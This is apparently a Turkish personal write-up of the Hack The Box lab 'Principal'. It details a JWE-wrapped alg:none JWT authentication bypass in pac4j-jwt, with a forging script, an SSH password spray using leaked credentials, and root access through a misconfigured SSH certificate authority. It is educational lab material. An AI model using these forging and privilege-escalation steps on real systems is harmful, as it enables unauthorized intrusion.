---
title: "Principal — HTB Lab Raporu"
date: 2026-07-21 05:41:00 +0300
categories: [HTB]
tags: [jwt, jwe, pac4j, cve-2026-29000, ssh-ca, privesc, linux]
image: /assets/img/posts/principal.svg
---

> Hack The Box · Medium · Linux
{: .prompt-info }

Kriptografik zarfın doğrulanmasıyla içindeki kimlik iddiasının doğrulanmasının aynı şey olmadığı bir makine. `pac4j-jwt`'te imzasız bir JWT'yi geçerli bir JWE içine sararak kimlik doğrulamayı atlatan bir zincirle başlıyor, yanlış yapılandırılmış bir SSH sertifika otoritesi üzerinden root'a uzanıyor.

| Hedef | Zorluk | İşletim Sistemi | Kategori |
|---|---|---|---|
| 10.129.52.59 | Medium | Ubuntu 24.04 LTS | Web / JWT-JWE / SSH CA |

**Zincir:** Recon → pac4j-jwt JWE/JWT bypass (CVE-2026-29000) → admin (web) → parola sızıntısı → svc-deploy (SSH) → SSH CA sertifika forgery → root

## 01 — Keşif: Port taraması ve web parmak izi

Standart bir Nmap taramasında iki servis bulundu: SSH ve `8080/tcp` üzerinde bir Jetty uygulaması. Yanıt başlıkları, uygulamanın kimlik doğrulamasını `pac4j-jwt` kütüphanesiyle yaptığını doğrudan ifşa ediyordu.

```console
$ nmap -sV -sC 10.129.244.220
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
8080/tcp open  http-proxy Jetty
|_http-title: Principal Internal Platform - Login
|_X-Powered-By: pac4j-jwt/6.0.3
```

## 02 — Web Uygulaması Analizi: İstemci tarafı kaynak kodunda kimlik doğrulama akışı

`/static/js/app.js`, kimlik doğrulama akışını yorum satırlarında baştan sona belgelemişti — üretim ortamında olmaması gereken, ama saldırgan için tam ihtiyaç duyulan seviyede bir bilgi sızıntısı.

```console
 * Authentication flow:
 * 1. User submits credentials to /api/auth/login
 * 2. Server returns encrypted JWT (JWE) token
 * 3. Token is stored and sent as Bearer token
 *
 * Token handling:
 * - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
 * - Public key available at /api/auth/jwks
 * - Inner JWT is signed with RS256

 * JWT claims schema: sub / role (ROLE_ADMIN|ROLE_MANAGER|ROLE_USER) / iss / iat / exp
```

`/api/auth/jwks` uç noktası, sunucunun JWE şifrelemesinde kullandığı 2048-bit RSA açık anahtarını doğrudan yayınlıyordu:

```console
$ curl -s http://10.129.244.220:8080/api/auth/jwks | jq
{
  "keys": [{
    "kty": "RSA", "e": "AQAB", "kid": "enc-key-1",
    "n": "lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5Np..." (256 bayt, 2048-bit)
  }]
}
```

> **Gözlem:** JWKS yalnızca *şifreleme* anahtarını yayınlıyor, imza doğrulama anahtarı ayrı ve gizli tutulmuş. Ama RSA-OAEP açık anahtarla şifreleme yapıldığı için bu anahtarı bilen herkes, sunucunun kabul edeceği formatta geçerli bir JWE zarfı üretebilir. Asıl soru, zarfın içine ne konduğu.
{: .prompt-info }

## 03 — Foothold: CVE-2026-29000 — pac4j-jwt kimlik doğrulama atlatması

`pac4j-jwt` 6.0.3'ün `JwtAuthenticator`'ı hem şifreleme (JWE) hem imza (JWS) doğrulamasıyla yapılandırıldığında: JWE decrypt edilir, içindeki payload'a `toSignedJWT()` çağrılır. Payload imzasız bir `PlainJWT` (`{"alg":"none"}`) ise bu çağrı `null` döner — kod `if (signedJWT != null)` kontrolü yüzünden imza doğrulaması tamamen atlanır. Zarf gerçek, ama içindeki kimlik iddiası hiç sorgulanmıyor.

> **CVSS 3.1 — Kendi değerlendirmem:** 9.8 Critical — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
{: .prompt-danger }

```console
# alg:none, sub=admin, role=ROLE_ADMIN claim'li imzasız PlainJWT kur,
# RSA-OAEP-256 + A128GCM ile cty:"JWT" header'ıyla JWE'ye sar

header  = b64url({"alg": "none"})
payload = b64url({"sub": "admin", "role": "ROLE_ADMIN",
                   "iss": "principal-platform", "iat": now, "exp": now+3600})
plain_jwt = f"{header}.{payload}."          # imzasız, 3. segment boş

jwe_token = jwe.JWE(plain_jwt.encode(), recipient=pub_key,
    protected=json.dumps({"alg": "RSA-OAEP-256", "enc": "A128GCM",
                           "kid": "enc-key-1", "cty": "JWT"}))
```

> **Debug günlüğü — asıl tuzak:** Script birebir doğru olmasına rağmen sunucu ısrarla `401 Invalid or expired token` döndürdü. İki farklı JOSE kütüphanesi, farklı header sıraları, makine resetleri — hiçbiri çözmedi. Gerçek sebep kriptografiyle ilgili değildi: **saldırgan makinenin saati sunucudan 3 saat ileriydi.** Ürettiğimiz her `iat` sunucu için gelecekte kalıyor, doğrulayıcı da sessizce reddediyordu. Çözüm: `iat`/`exp`'i kendi saatimiz yerine sunucunun HTTP `Date` header'ından hesaplamak.
{: .prompt-warning }

```console
$ python3 jwt_forge.py http://10.129.52.59:8080
[*] Server time from Date header: epoch 1784396623
[*] Local epoch would have been: 1784407425 (diff: 10802s)
[+] Forged JWE token created

[*] Accessing /api/dashboard...
[+] Status: 200
{"user": {"username": "admin", "role": "ROLE_ADMIN"}, ...}
```

## 04 — Yanal Hareket: Admin panelinden sızan parola ve SSH erişimi

Sahte admin token'ıyla `/api/users` ve `/api/settings` açıldı. Settings'in Security sekmesinde, dışarıya hiç expose edilmemesi gereken bir `encryptionKey` alanı vardı — deploy servisleri için kullanılan bir parolaya çok benziyordu.

| Kullanıcı | Rol | Departman | Durum |
|---|---|---|---|
| admin | ROLE_ADMIN | IT Security | Active |
| svc-deploy | deployer | DevOps | Active |
| jthompson | ROLE_USER | Engineering | Active |
| bwright | ROLE_MANAGER | Operations | Active |
| kkumar | ROLE_ADMIN | IT Security | Disabled |

```console
$ nxc ssh 10.129.52.59 -u users.txt -p 'D3pl0y_$$H_Now42!'
SSH   10.129.52.59  22  [-] admin:D3pl0y_$$H_Now42!
SSH   10.129.52.59  22  [+] svc-deploy:D3pl0y_$$H_Now42!  Linux - Shell access!

$ ssh svc-deploy@10.129.52.59
svc-deploy@principal:~$ id
uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
svc-deploy@principal:~$ cat user.txt
```

> ✅ user.txt ele geçirildi
{: .prompt-tip }

## 05 — Yetki Yükseltme: SSH CA sertifika forgery

`deployers` grubu, `/opt/principal/ssh/` altındaki bir SSH CA private key'ini okuyabiliyordu. `sshd` yapılandırması bu CA'yı `TrustedUserCAKeys` ile güveniyordu — ama `AuthorizedPrincipalsFile` tanımlı değildi. Bu, foothold'daki aynı hatanın SSH dünyasındaki karşılığı: sertifika CA tarafından imzalandığı sürece, içindeki principal alanı ne olursa olsun kabul ediliyor.

> **CVSS 3.1 — Kendi değerlendirmem:** 8.8 High — `AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`
{: .prompt-danger }

```console
PubkeyAuthentication yes
PermitRootLogin prohibit-password
TrustedUserCAKeys /opt/principal/ssh/ca.pub   ← AuthorizedPrincipalsFile yok
```

```console
$ ssh-keygen -t ed25519 -f /tmp/pwn -N ""
$ ssh-keygen -s /opt/principal/ssh/ca -I "pwn-root" -n root -V +1h /tmp/pwn.pub
Signed user key /tmp/pwn-cert.pub: id "pwn-root" serial 0 for root valid from ...

$ ssh -i /tmp/pwn root@localhost
root@principal:~# id
uid=0(root) gid=0(root) groups=0(root)
root@principal:~# cat root.txt
```

> ✅ root.txt ele geçirildi — makine tamamlandı
{: .prompt-tip }

## Özet — Öğrenilen teknikler

- `pac4j-jwt`'te JWE/JWS iç içe kullanıldığında, decrypt edilen payload imzasız (`alg:none`) bir `PlainJWT` ise imza doğrulamasının nasıl sessizce atlanabildiği (CVE-2026-29000).
- JWKS üzerinden yalnızca *şifreleme* anahtarının yayınlanmasının bile, açık-anahtar şifrelemenin doğası gereği geçerli zarf üretimine yetebileceği.
- Sahte token'ın `iat`/`exp` claim'lerini kendi saatimiz yerine sunucunun HTTP `Date` header'ından türetmenin önemi — saat kayması, kriptografiden çok daha sık başarısızlık sebebi.
- OpenSSH'te `TrustedUserCAKeys` tanımlanıp `AuthorizedPrincipalsFile`/`-Command` unutulduğunda, CA imzası geçerli olan her sertifikanın *istenen herhangi bir principal* için kabul edildiği.

---

Kişisel HTB lab notu — Principal (10.129.52.59) — Hack The Box, eğitim/lab ortamı. Flag değerleri platform politikası gereği bu belgede paylaşılmamıştır.
